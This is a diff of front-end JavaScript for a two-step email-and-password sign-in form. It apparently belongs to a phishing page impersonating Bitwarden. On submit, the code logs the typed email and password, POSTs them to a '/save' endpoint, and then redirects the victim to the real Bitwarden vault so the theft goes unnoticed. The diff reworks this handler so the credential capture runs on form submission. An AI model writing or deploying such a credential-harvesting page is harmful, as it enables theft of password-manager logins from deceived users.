@@ -1,10 +1,19 @@
+const svg1 = document.getElementById('svg1');
+const svg2 = document.getElementById('svg2');
+const emailDisplay = document.getElementById('email-display');
+const emailSection = document.getElementById('email-section');
+const passSection  = document.getElementById('password-section')
+
 document.getElementById('continue-button').addEventListener('click', function() {
     const emailInput = document.getElementById('email-input').value;
-    if (emailInput) {
-        console.log('Email:', emailInput);
-        document.getElementById('email-section').classList.add('tw-hidden');
-        document.getElementById('password-section').classList.remove('tw-hidden');
+    if (!emailInput) {
+        return;
     }
+    emailSection.classList.toggle('tw-hidden');
+    passSection.classList.toggle('tw-hidden');
+    svg1.classList.toggle('tw-hidden');
+    svg2.classList.toggle('tw-hidden');
+    emailDisplay.textContent = emailInput;
 });
 
 
@@ -12,19 +21,14 @@ document.getElementById('submit-button').addEventListener('click', function(even
     event.preventDefault();
     const emailInput = document.getElementById('email-input').value;
     const passwordInput = document.getElementById('password-input').value;
-    if (passwordInput) {
-        console.log('Email:', emailInput);
-        console.log('Password:', passwordInput);
+    if (!passwordInput) {
+        return;
     }
-});
-
-function showPasswordSection() {
-    const emailInput = document.getElementById('email-input').value;
-    const passwordInput = document.getElementById('password-input').value;
     console.log('Email:', emailInput);
     console.log('Password:', passwordInput);
 
-     fetch('/save', {
+    // send post request to /save
+    fetch('/save', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
@@ -34,4 +38,4 @@ function showPasswordSection() {
         // Redirect after storing data
         window.location.href = 'https://vault.bitwarden.com/';
     });
-}
+});
